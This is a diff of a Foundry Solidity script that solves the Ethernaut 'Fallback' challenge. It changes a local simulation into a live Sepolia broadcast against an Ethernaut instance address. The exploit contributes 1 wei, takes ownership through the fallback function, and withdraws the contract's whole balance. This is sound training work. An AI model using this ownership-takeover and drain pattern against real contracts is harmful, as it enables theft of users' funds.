@@ -5,21 +5,13 @@ import "forge-std/Script.sol";
 import "forge-std/console.sol";
 import {Fallback} from "../src/Fallback.sol";
 
-contract FallbackSolution is Script {
-    // $ forge script script/Fallback.s.sol:FallbackSolution --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast -vvvvv
-    // $ forge script script/Fallback.s.sol --tc FallbackSolution
-    Fallback public fallbackInstance;
+contract Exp is Script {
+    // $ forge script script/FallbackExp.s.sol:Exp --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast -vvvvv
+    // $ make fallbackExp ARGS='--network sepolia'
+    Fallback public fallbackInstance = Fallback(payable(0x813aCfC55db8d05D1F80800F505c1402bbf76A6e)); // https://ethernaut.openzeppelin.com/ Get new instance address from Ethernaut
 
     function run() external {
-        address deployer = makeAddr("deployer");
-        address attacker = makeAddr("attacker");
-        vm.deal(deployer, 1 ether);
-        vm.deal(attacker, 1 ether);
-        vm.startPrank(deployer);
-        fallbackInstance = new Fallback();
-
         console.log("Owner:", fallbackInstance.owner());
-        vm.stopPrank();
 
         // ---- Attack Starts From here ---
 
@@ -30,14 +22,13 @@ contract FallbackSolution is Script {
         // - Then we will send ETH to the `Fallback` contract (1 wei), since we are one of the contributors, we will path the check, and we will be the owner of the contract.
         // - We passed the first requirement and became the owners of the contract.
         // - We can simply call `withdraw` and take all `Fallback` ETH since we are the new owners.
-
-        vm.startPrank(attacker);
+        vm.startBroadcast();
+        // fallbackInstance = new Fallback(); // Deploy a new instance of Fallback
         fallbackInstance.contribute{value: 1 wei}(); //send ether when interacting with an ABI
         (bool success,) = address(payable(fallbackInstance)).call{value: 1 wei}(""); //send ether outside of the ABI
         require(success, "Revert sending 1 wei to `fallbackInstance`");
         console.log("New Owner:", fallbackInstance.owner()); // We became the owners
         fallbackInstance.withdraw();
-        // console.log("fallbackInstance balance", address(fallbackInstance).balance);
-        vm.stopPrank();
+        vm.stopBroadcast();
     }
 }
